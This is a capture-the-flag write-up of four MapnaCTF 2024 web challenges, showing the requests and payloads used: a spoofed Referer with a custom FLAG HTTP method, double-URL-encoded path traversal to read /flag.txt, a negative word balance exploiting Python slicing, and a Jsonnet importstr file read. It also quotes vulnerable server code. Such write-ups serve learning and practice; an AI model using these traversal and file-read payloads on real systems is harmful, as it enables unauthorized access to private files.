---
title: MapnaCTF 2024 web challenges
date: 2024-01-21
tags: 
- web
- author-hartmannsyg
categories: MapnaCTF 2024
---

solved by {% person hartmannsyg %}

## Flag Holding

We are given a website:
{% ccb terminal:true %}
http://18.184.219.56:8080/
{% endccb %}

![You are not coming from "http://flagland.internal/".](/static/MapnaCTF2024/flag_holding.png)

We then set the Referer header to http://flagland.internal/:

{% ccb terminal:true lang:http %}
Referer: http://flagland.internal/
{% endccb %}
```html
	<div class="msg" style="">
		Unspecified "secret".	</div>
```

We create a url parameter called `secret`: http://18.184.219.56:8080?secret=

{% ccb lang:html gutter1:1,2, wrapped:true %}
<div class="msg" style="">
		Incorrect secret. <!-- hint: secret is ____ which is the name of the protocol that both this server and your browser agrees on... -->	</div>
{% endccb %}

the protocol is http, so http://18.184.219.56:8080?secret=http with the header gives us:

```html
	<div class="msg" style="">
		Sorry we don't have "GET" here but we might have other things like "FLAG".	</div>
```

We have to use a custom http method `FLAG` instead of `GET`:

```html
	<div class="msg" style="">
		MAPNA{533m5-l1k3-y0u-kn0w-h77p-1836a2f}	</div>
```

(btw I used https://hoppscotch.io/ for all this since that way I don't have to code out things)

## Novel Reader

We see that there is a `/read` function:

```http
GET /api/read/public/A-Happy-Tale.txt HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en
Connection: keep-alive
Cookie: session=eyJjcmVkaXQiOjEwMCwid29yZHNfYmFsYW5jZSI6MX0.Za000Q.zcBtJvYM3vXoJBf_o6j8gd_g9n4
Host: 3.64.250.135:9000
Referer: http://3.64.250.135:9000/
Sec-GPC: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
```

We want to read /flag.txt, but our `/read` call must evaluate to a `/public` directory (or at least it must start with `/public`):
{% ccb lang:py gutter1:43-50 caption:main.py highlight:4 %}
@app.get('/api/read/<path:name>')
def readNovel(name):
    name = unquote(name)
    if(not name.startswith('public/')):
        return {'success': False, 'msg': 'You can only read public novels!'}, 400
    buf = readFile(name).split(' ')
    buf = ' '.join(buf[0:session['words_balance']])+'... Charge your account to unlock more of the novel!'
    return {'success': True, 'msg': buf}
{% endccb %}

So instead of doing `http://3.64.250.135:9000/api/read/public/../../../../flag.txt`, we can *double url encode* the `../` to become `%252e%252e%252f`

{% ccb lang:http wrapped:true %}
GET /api/read/public/%252e%252e%252f%252e%252e%252fflag.txt HTTP/1.1
{% endccb %}
{% ccb lang:json wrapped:true gutter1:1,2,,3,4 %}
{
  "msg": "MAPNA{uhhh-1-7h1nk-1-f0r607-70-ch3ck-cr3d17>0-4b331d4b}\n\n... Charge your account to unlock more of the novel!",
  "success": true
}
{% endccb %}

## Novel Reader 2

We can use the same double url encoding trick to read `A-Secret-Tale.txt`, but we seem to not have enough words, even when we charge the number of words to 11 (remember to update the Cookie header if you are writing code to send the request)

{% ccb lang:json wrapped:true gutter1:1,2,,3,4 %}
{
  "msg": "Once a upon time there was a flag. The flag was... Charge your account to unlock more of the novel!",
  "success": true
}
{% endccb %}

We look at the specific line of code that is blocking us from accessing the flag:

{% ccb lang:py gutter1:43-50 caption:main.py highlight:7 %}
@app.get('/api/read/<path:name>')
def readNovel(name):
    name = unquote(name)
    if(not name.startswith('public/')):
        return {'success': False, 'msg': 'You can only read public novels!'}, 400
    buf = readFile(name).split(' ')
    buf = ' '.join(buf[0:session['words_balance']])+'... Charge your account to unlock more of the novel!'
    return {'success': True, 'msg': buf}
{% endccb %}

Normally, what this would do is trim the `buf` to only include words `0` to `session['words_balance']`.

However, python allows for negative indexing as well, where `-1` represents the last element:

```py
>>> a='0123456789'
>>> a[0:-1]
'012345678'
```

So if we deduct and deduct until our `words_balance` is `-1`, we get:

![Words Balance: -1](/static/MapnaCTF2024/novel_reader.png)

{% ccb lang:json wrapped:true gutter1:1,2,,3,4 %}
{
  "msg": "Once a upon time there was a flag. The flag was read like this: MAPNA{uhhh-y0u-607-m3-4641n-3f4b38571}.... Charge your account to unlock more of the novel!",
  "success": true
}
{% endccb %}

(remember to update the Cookie header if you are writing code to send the request)

## Advanced JSON Cutifier

> My homework was to write a JSON beautifier. Just Indenting JSON files was too boring that's why I decided to add some features to my project using a popular (More than 1k stars on GitHub!! ) library to make my project more exciting.
> **Important: You can't read any file other than /flag.txt on the remote environment.**

![](/static/MapnaCTF2024/advanced_json_cutifier.png)

we see that `1335+2` gets evaluated to `1337`. So it is probably something like a template injection? After a bit of fiddling (actually like half a day worth of fiddling), I tried:
```json
{"wow so advanced!!": import "os"}
```
and got:
```json
RUNTIME ERROR: couldn't open import "os": no match locally or in the Jsonnet library paths
	ctf:1:23-34	object <anonymous>
	Field "wow so advanced!!"	
	During manifestation	
```
We *finally* got the name of the library (Jsonnet). I then searched up how to read file contents using Jsonnet and got this github issue: https://github.com/google/jsonnet/issues/238

In there, they said something like:
```
std.assertEqual(importstr "lib/some_file.txt", "Hello World!\n") && 
```

So I tried importstr
```json
{"wow so advanced!!": importstr "flag.txt"}
```
and got
```json
{
   "wow so advanced!!": "MAPNA{5uch-4-u53ful-f347ur3-a23f98d}\n\n"
}
```